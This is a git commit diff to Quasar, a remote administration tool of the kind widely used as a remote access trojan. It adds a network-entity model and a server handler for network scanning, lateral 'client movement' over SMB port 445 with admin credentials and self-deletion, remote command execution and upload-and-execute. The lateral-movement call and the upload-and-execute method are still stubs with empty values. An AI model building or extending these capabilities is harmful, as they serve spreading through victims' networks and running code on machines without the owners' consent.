defbdd8b6a2a92ded848f8456ef8a8f5f1103e91
DeadmanLabs <michael.magahey@gmail.com>
2025-03-30 18:47:48 -0400

    Model and initial handler

---
+++ Quasar.Common/Models/NetworkEntity.cs
@@ -0,0 +1,24 @@
+﻿using ProtoBuf;
+using Quasar.Common.Enums;
+
+namespace Quasar.Common.Models
+{
+    [ProtoContract]
+    public class NetworkEntity
+    {
+        [ProtoMember(1)]
+        public string Interface { get; set; }
+
+        [ProtoMember(2)]
+        public string MAC { get; set; }
+
+        [ProtoMember(3)]
+        public string Address { get; set; }
+
+        [ProtoMember(4)]
+        public int[] Ports { get; set; }
+
+        [ProtoMember(5)]
+        public string[] Shares { get; set; }
+    }
+}
--- Quasar.Server/Messages/NetworkHandler.cs
+++ Quasar.Server/Messages/NetworkHandler.cs
@@ -1,12 +1,67 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+﻿using Quasar.Common.Enums;
+using Quasar.Common.Messages;
+using Quasar.Common.Messages.other;
+using Quasar.Common.Models;
+using Quasar.Common.Networking;
+using Quasar.Server.Networking;
+using Quasar.Server.Models;
+using System.Windows.Forms;
+using Quasar.Server.Forms;
+using Quasar.Common.Messages.Network;
+using System.Collections;
 
 namespace Quasar.Server.Messages
 {
-    internal class NetworkHandler
+    public class NetworkHandler : MessageProcessorBase<NetworkEntity[]>
     {
+
+
+        private readonly Client _client;
+
+        public NetworkHandler(Client client) : base(true)
+        {
+            _client = client;
+        }
+
+        public override bool CanExecute(IMessage message) => message is DoNetworkScanResponse ||
+                                                             message is DoClientMovementResponse ||
+                                                             message is DoRemoteCommandExecuteResponse ||
+                                                             message is DoUploadAndExecuteResponse;
+
+        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
+
+        public override void Execute(ISender sender, IMessage message)
+        {
+            switch (message)
+            {
+                case DoNetworkScanResponse scanResp:
+                    Execute(sender, scanResp);
+                    break;
+                case DoClientMovementResponse moveResp:
+                    Execute(sender, moveResp);
+                    break;
+                case DoRemoteCommandExecuteResponse cmdResp:
+                    Execute(sender, cmdResp);
+                    break;
+                case DoUploadAndExecuteResponse uploadResp:
+                    Execute(sender, uploadResp);
+                    break;
+            }
+        }
+
+        public void RefreshEntities()
+        {
+            _client.Send(new DoNetworkScan());
+        }
+
+        public void MoveToEntity(NetworkEntity entity)
+        {
+            _client.Send(new DoClientMovement { Address = "", AsAdmin = true, DeleteAfter = true, MAC = "", Username = "", Password = "", Port = 445, Share = "" });
+        }
+
+        public void UploadAndExecte(NetworkEntity entity)
+        {
+
+        }
     }
 }
